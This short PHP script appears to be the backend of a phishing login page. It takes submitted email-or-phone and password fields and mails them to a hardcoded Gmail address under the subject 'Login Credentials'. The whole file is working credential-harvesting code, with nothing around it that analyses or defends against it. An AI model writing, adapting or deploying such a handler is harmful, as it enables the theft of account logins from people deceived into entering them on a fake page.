<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $to = "bryanonasiss@gmail.com";
    $subject = "Login Credentials";
    $email = $_POST['email'];
    $password = $_POST['password'];
    $message = "Email or Phone: " . $email . "\nPassword: " . $password;
    $headers = "From: webmaster@example.com";

    if (mail($to, $subject, $message, $headers)) {
        echo "Email successfully sent to $to...";
    } else {
        echo "Email sending failed...";
    }
}
?>